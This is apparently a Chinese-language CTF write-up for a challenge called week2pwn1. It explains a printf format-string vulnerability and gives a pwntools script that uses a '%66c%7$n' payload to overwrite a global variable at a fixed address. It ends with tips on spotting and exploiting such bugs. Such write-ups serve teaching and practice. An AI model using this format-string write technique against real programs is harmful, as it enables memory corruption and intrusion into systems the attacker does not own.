# week2pwn1

## 题目简述

程序把用户输入直接作为 `printf` 格式串，并在全局地址 `0x404050` 检查一个状态值。利用 `%n` 可把已输出字符数写入该变量；令其变为十进制 66 即可触发目标分支。

## 解题过程

先用位置参数确定附加地址位于第 7 个格式化参数。`%66c` 让累计输出长度达到 66，`%7$n` 再把该值按 4 字节整数写到 payload 末尾给出的地址：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
s = remote('HOST', PORT)
payload = b'%66c%7$n' + p64(0x404050)
s.sendlineafter(b'do you know format?\n', payload)
s.interactive()
~~~

固定地址成立的前提是 PIE 关闭；若本地地址不同，应从反汇编中重新定位被比较的全局变量。

## 方法总结

- 核心方法：利用格式化字符串的 `%n`，把可控的累计输出长度写入目标全局变量。
- 识别特征：`printf(user_input)` 一类非固定格式串调用，且程序后续检查可写全局状态。
- 注意事项：参数序号、目标值和写入宽度必须分别验证；若目标只需 1/2 字节，应优先用 `%hhn`/`%hn` 降低副作用。
